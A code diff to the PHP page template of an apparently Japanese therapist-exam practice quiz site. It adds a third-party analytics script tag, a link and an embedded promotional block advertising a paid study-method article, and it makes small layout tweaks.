@@ -36,6 +36,7 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
 
         <script src="jquery-1.7.1.min.js" type="text/javascript" charset="utf-8"></script>
         <script src="qmView.js" type="text/javascript" charset="utf-8"></script>
+        <script src="//kitchen.juicer.cc/?color=C3idgkPnXPA=" async></script>
     </head>
     <body id="page" class="col2r">
         <div id="fb-root"></div>
@@ -134,6 +135,7 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
                                             <?php  qmNoQ("全<%ALL%>問中<%START%>問～<%END%>問");  ?>
                                         </h1>
 
+										<div style="text-align:center;margin-bottom:10px;font-size:16px;"><a target="_blank" href="https://note.mu/ptot_kokushi/n/n8b9e47437ba3">勉強へのやる気がでなくて悩んでいる方はこちら＞</a></div>
 
                                         <div id="qm-exam-description" >
                                             <?php qmAbstract();  /*設問の説明文*/?>
@@ -148,6 +150,7 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
 
                                     <div class="qm-pagination">
                                         <?php qmPagenation() ?>
+                                        <div class="clearfix"></div>
                                     </div>
 
                                 </div>
@@ -165,6 +168,17 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
                             <!--        ]]>-->
                             <!--    </script><span class="ninja_onebutton_hidden" style="display:none;"></span><span style="display:none;" class="ninja_onebutton_hidden"></span>-->
                             <!--</div>-->
+                            <div class="note col-md-12">
+                            <h2>勉強方法に悩んでいませんか？</h2>
+                            <p>国家試験合格に向けて勉強していくにしても、ただがむしゃらに、気合を入れてやっても疲れてしまい続きません。</p>
+                            <p>でも、そうは言っても、効率の良い勉強方法なんて知らないし、どうせ続かない･･･        そう思っていませんか？</p>
+                            <p>でも、大丈夫です。<span class="note-span">勉強方法を習得することは誰にでもできて</span>、がむしゃらに勉強するよりも<span class="note-span">楽しく継続して勉強ができます！</span></p>
+                            <p><span class="note-span">勉強嫌いで偏差値が30しかなかった私でも、そうすることで合格できたのですから。</span></p>
+                            <p>そんな私が実践した一生ものの勉強法を、多くの方が知り、国家試験に合格して幸せな療法士生活を送れるように、<span class="note-span">今だけワンコインで提供しています。</span></p>
+                            <p><span class="note-span">勉強が嫌い、勉強が苦手、記憶力に自信がない、勉強が続かない、合格できるか不安･･･</span>など感じている人は是非このnoteを読んでください。</p>
+                            <p>そして、つらくない勉強法を身に付け、<span class="note-span">気持ちよく合格しましょう！！</span></p>
+                            <iframe class="note-embed" src="https://note.mu/embed/notes/n8b9e47437ba3" style="border: 0; display: block; max-width: 99%; width: 494px; padding: 0px; margin: 10px 0px; position: static; visibility: visible; " height="400"></iframe><script async src="https://note.mu/scripts/embed.js" charset="utf-8"></script>
+                            </div>
 
 
                             <!--<br />-->
@@ -435,7 +449,7 @@ require_once(dirname(__FILE__).'/../qmApp/view.php');
                 <p><small>Copyright (C) 2014 あなたのお名前 <span>All Rights Reserved.</span></small></p>
             </div>
             <!--/コピーライト--><!--▼ページの先頭へ戻る-->
-            <p class="page-top"><a href="#container">このページの先頭へ</a></p>
+        <p class="page-top"><a href="#container">▲</a></p>
             <!--▲ページの先頭へ戻る-->
         </div>
         <script type="text/javascript">
